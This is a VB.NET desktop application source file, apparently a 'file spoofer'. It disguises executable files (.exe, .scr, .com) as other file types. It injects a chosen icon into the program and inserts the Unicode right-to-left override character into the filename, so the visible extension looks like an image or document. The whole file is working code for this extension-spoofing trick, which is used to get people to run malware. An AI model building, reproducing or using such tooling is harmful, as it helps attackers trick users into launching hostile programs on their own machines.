Imports System.IO
Imports Microsoft.Win32

Class MainWindow

    Private IconFolderName = My.Application.Info.DirectoryPath + "\" + "Win10Icons"

    Public Sub Main()
        'Check if Win10Icons exists, if not select a folder
        If Dir$("Win10Icons", vbDirectory) <> vbNullString Then
            AddSpoofExtensions("Win10Icons")
        Else
            MessageBox.Show("Win10Icons folder not found, please select a folder with icons or download Win10Icons at github.com/henriksb/filespoofer.", "Win10Icons folder not found", MessageBoxButton.OK, MessageBoxImage.Warning)

            Dim IconFolder As Forms.FolderBrowserDialog
            IconFolder = New Forms.FolderBrowserDialog
            IconFolder.Description = "Select icon folder"
            IconFolder.ShowDialog()

            IconFolderName = IconFolder.SelectedPath

            'If no folder is selected, exit program
            If String.IsNullOrWhiteSpace(IconFolderName) Then
                Environment.Exit(0)
            End If

            AddSpoofExtensions(IconFolderName)
        End If

        'Insert executable extensions into dropdownmenu
        Dim SourceExtensions = {"scr", "exe", "com"}
        Dim i = 0
        For Each Extension In SourceExtensions
            SourceExtension.Items.Insert(i, Extension)
            i += 1
        Next
    End Sub

    'Inserts all extensions from selected icon folder into dropdownmenu
    Private Sub AddSpoofExtensions(Path As String)
        Dim DI As New DirectoryInfo(Path)
        Dim FolderContents As FileInfo() = DI.GetFiles()
        Dim Icon As FileInfo

        Dim index = 0
        For Each Icon In FolderContents
            SpoofExtension.Items.Insert(index, Icon.ToString().Split(".")(0))
            index += 1
        Next
    End Sub

    Private Sub OpenFile_Click(sender As Object, e As RoutedEventArgs) Handles OpenFile.Click
        Dim fd As OpenFileDialog = New OpenFileDialog()

        fd.Title = "Open File Dialog"
        fd.Filter = "Executable files (*.exe)|*.exe"
        fd.FilterIndex = 2
        fd.RestoreDirectory = True

        Dim Result = fd.ShowDialog()
        Dim ExeFile = fd.FileName

        CurrentFile.Text = ExeFile
    End Sub

    'Next three methods are only for updating the live view of your output file
    Private Sub SpoofExtension_DropDownClosed(sender As Object, e As EventArgs) Handles SpoofExtension.DropDownClosed
        UpdateName()
    End Sub

    Private Sub SourceExtension_DropDownClosed(sender As Object, e As EventArgs) Handles SourceExtension.DropDownClosed
        UpdateName()
    End Sub

    Private Sub NameInput_TextChanged(sender As Object, e As TextChangedEventArgs) Handles NameInput.TextChanged
        UpdateName()
    End Sub

    Private Sub UpdateName()
        'Update name and image
        OutputName.Text = NameInput.Text + StrReverse(SourceExtension.Text) + "." + SpoofExtension.Text
        Try
            IconImage.Source = New BitmapImage(New Uri(IconFolderName + "\" + SpoofExtension.Text + ".ico"))
        Catch
        End Try
    End Sub

    'Check if all required fields are filled in
    Private Sub GenerateButton_Click(sender As Object, e As RoutedEventArgs) Handles GenerateButton.Click
        If String.IsNullOrWhiteSpace(SpoofExtension.Text) Or String.IsNullOrWhiteSpace(SourceExtension.Text) Or CurrentFile.Text = "Current file: None" Or String.IsNullOrWhiteSpace(CurrentFile.Text) Then
            MessageBox.Show("Please fill in all fields before generating", "Not all fields filled in", MessageBoxButton.OK, MessageBoxImage.Warning)
            Return
        End If

        'In case file is deleted/moved after it has been selected
        If Not Dir(CurrentFile.Text) <> "" Then
            MessageBox.Show("File does not exist. Please select a new file.", "File does not exist", MessageBoxButton.OK, MessageBoxImage.Warning)
            Return
        End If

        Dim ReverseCharacter As String = ChrW("&H202E")
        Dim SpoofName = NameInput.Text + ReverseCharacter + StrReverse(SpoofExtension.Text) + "." + SourceExtension.Text

        Iconchanger.InjectIcon(CurrentFile.Text, IconFolderName + "\" + SpoofExtension.Text + ".ico")
        My.Computer.FileSystem.RenameFile(CurrentFile.Text, SpoofName)

        MessageBox.Show("Successfully spoofed file!", "Success", MessageBoxButton.OK, MessageBoxImage.Information)
    End Sub
End Class
